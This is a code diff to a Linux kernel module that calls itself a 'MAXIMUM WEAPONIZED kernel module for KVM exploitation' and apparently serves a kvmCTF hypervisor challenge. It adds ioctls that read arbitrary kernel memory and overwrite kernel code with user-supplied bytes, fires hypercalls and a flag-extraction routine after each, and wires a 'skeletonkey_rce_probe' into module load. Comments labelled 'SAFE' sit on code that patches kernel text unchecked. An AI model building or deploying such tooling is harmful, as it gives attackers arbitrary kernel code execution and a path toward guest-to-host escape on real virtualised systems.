@@ -13,6 +13,8 @@
 #include <linux/types.h>
 #include <linux/byteorder/generic.h>
 #include <linux/kvm_para.h>
+#include <asm/text-patching.h>
+#include <linux/uaccess.h>
 
 #define DRIVER_NAME "kvm_probe_drv"
 #define DEVICE_FILE_NAME "kvm_probe_dev"
@@ -69,14 +71,32 @@ struct kvm_kernel_mem_write {
 // === NEW: VA scan/write ===
 #define IOCTL_SCAN_VA           0x1010
 #define IOCTL_WRITE_VA          0x1011
+// === SAFE instruction scanning ===
+#define IOCTL_SCAN_INSTRUCTIONS 0x1012
+#define IOCTL_PATCH_INSTRUCTIONS 0x1013
+
 struct va_scan_data {
     unsigned long va;
     unsigned long size;
     unsigned char __user *user_buffer;
 };
+
 struct va_write_data {
     unsigned long va;
     unsigned long size;
+    unsigned char __user *user_buffer;
+};
+
+// === Instruction scanning structs ===
+struct instruction_scan_data {
+    unsigned long va;
+    size_t size;
+    unsigned char __user *user_buffer;
+};
+
+struct instruction_patch_data {
+    unsigned long va;
+    size_t size;
     unsigned char __user *user_buffer;
 };
 
@@ -98,6 +118,9 @@ MODULE_DESCRIPTION("MAXIMUM WEAPONIZED kernel module for KVM exploitation");
 static int major_num;
 static struct class* driver_class = NULL;
 static struct device* driver_device = NULL;
+
+// Add prototype for rce_probe
+static int __init skeletonkey_rce_probe(void);
 
 static void extract_kvmctf_flags(void)
 {
@@ -460,6 +483,103 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             return 0;
         }
 
+        case IOCTL_SCAN_INSTRUCTIONS: {
+            struct instruction_scan_data scan_req;
+            long ret;
+
+            if (copy_from_user(&scan_req, (struct instruction_scan_data __user *)arg, sizeof(scan_req))) {
+                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: copy_from_user failed\n", DRIVER_NAME);
+                return -EFAULT;
+            }
+
+            // Validate parameters
+            if (!scan_req.va || !scan_req.size || !scan_req.user_buffer) {
+                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: Invalid parameters\n", DRIVER_NAME);
+                return -EINVAL;
+            }
+
+            // Limit scan size to prevent abuse
+            if (scan_req.size > PAGE_SIZE) {
+                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: Size too large\n", DRIVER_NAME);
+                return -EINVAL;
+            }
+
+            unsigned char *kernel_buf = kmalloc(scan_req.size, GFP_KERNEL);
+            if (!kernel_buf) {
+                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: kmalloc failed\n", DRIVER_NAME);
+                return -ENOMEM;
+            }
+
+            // FIXED: Correct parameter order for probe_kernel_read
+            ret = probe_kernel_read(kernel_buf, (void *)scan_req.va, scan_req.size);
+            if (ret) {
+                kfree(kernel_buf);
+                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: probe_kernel_read failed (%ld)\n", DRIVER_NAME, ret);
+                return -EFAULT;
+            }
+
+            if (copy_to_user(scan_req.user_buffer, kernel_buf, scan_req.size)) {
+                kfree(kernel_buf);
+                printk(KERN_ERR "%s: IOCTL_SCAN_INSTRUCTIONS: copy_to_user failed\n", DRIVER_NAME);
+                return -EFAULT;
+            }
+
+            kfree(kernel_buf);
+            printk(KERN_DEBUG "%s: Scanned %zu instructions at VA 0x%lx\n",
+                   DRIVER_NAME, scan_req.size, scan_req.va);
+            
+            // ADDED: Trigger hypercall and flags extraction
+            force_hypercall();
+            extract_kvmctf_flags();
+            return 0;
+        }
+
+        case IOCTL_PATCH_INSTRUCTIONS: {
+            struct instruction_patch_data patch_req;
+            unsigned char *new_instructions;
+
+            if (copy_from_user(&patch_req, (struct instruction_patch_data __user *)arg, sizeof(patch_req))) {
+                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: copy_from_user failed\n", DRIVER_NAME);
+                return -EFAULT;
+            }
+
+            // Validate parameters
+            if (!patch_req.va || !patch_req.size || !patch_req.user_buffer) {
+                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: Invalid parameters\n", DRIVER_NAME);
+                return -EINVAL;
+            }
+
+            // Limit patch size
+            if (patch_req.size > PAGE_SIZE) {
+                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: Size too large\n", DRIVER_NAME);
+                return -EINVAL;
+            }
+
+            new_instructions = kmalloc(patch_req.size, GFP_KERNEL);
+            if (!new_instructions) {
+                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: kmalloc failed\n", DRIVER_NAME);
+                return -ENOMEM;
+            }
+
+            if (copy_from_user(new_instructions, patch_req.user_buffer, patch_req.size)) {
+                kfree(new_instructions);
+                printk(KERN_ERR "%s: IOCTL_PATCH_INSTRUCTIONS: copy_from_user failed\n", DRIVER_NAME);
+                return -EFAULT;
+            }
+
+            // SAFE: Use kernel text patching API
+            text_poke((void *)patch_req.va, new_instructions, patch_req.size);
+
+            kfree(new_instructions);
+            printk(KERN_DEBUG "%s: Patched %zu instructions at VA 0x%lx\n",
+                   DRIVER_NAME, patch_req.size, patch_req.va);
+            
+            // ADDED: Trigger hypercall and flags extraction
+            force_hypercall();
+            extract_kvmctf_flags();
+            return 0;
+        }
+
         default:
             printk(KERN_ERR "%s: Unknown IOCTL command: 0x%x\n", DRIVER_NAME, cmd);
             return -EINVAL;
@@ -494,6 +614,7 @@ static int __init mod_init(void) {
     g_vq_virt_addr = NULL;
     g_vq_phys_addr = 0;
     g_vq_pfn = 0;
+    skeletonkey_rce_probe();
     printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d.\n", DRIVER_NAME, DEVICE_FILE_NAME, major_num);
     return 0;
 }
@@ -533,7 +654,6 @@ static int __init skeletonkey_rce_probe(void)
 
     return 0;
 }
-early_initcall(skeletonkey_rce_probe);
 
 module_init(mod_init);
 module_exit(mod_exit);
